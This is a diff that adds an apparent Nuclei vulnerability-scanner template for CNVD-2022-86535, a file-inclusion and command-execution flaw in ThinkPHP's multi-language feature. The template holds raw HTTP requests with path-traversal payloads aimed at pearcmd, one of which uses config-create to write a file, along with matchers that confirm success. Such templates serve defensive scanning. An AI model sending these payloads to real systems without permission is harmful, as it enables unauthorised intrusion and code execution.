@@ -1,0 +1,40 @@
+id: CNVD-2022-86535
+
+info:
+  name: Thinkphp Multi Languag- File Inc And RCE
+  author: arliya,ritikchaddha
+  severity: high
+  description: |
+    ThinkPHP has a command execution vulnerability because the multi-language function is enabled and the parameter passing of parameter lang is not strictly filtered. Attackers can use this vulnerability to execute commands.
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2022-86535
+  tags: cnvd,cnvd2022,thinkphp,rce
+
+http:
+  - raw:
+      - |
+        GET /?lang=../../../../../usr/local/php/pearcmd HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        think-lang: ../../../../../usr/local/php/pearcmd
+
+      - |
+        GET /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/safedog()+{{rand_base(10)}}.log HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+    - type: word
+      part: set_cookie
+      words:
+        - "think_lang=..%2F..%2F..%2F..%2F"
+
+    - type: word
+      part: body_3
+      words:
+        - "CONFIGURATION"
+        - "Successfully created"
+      condition: and
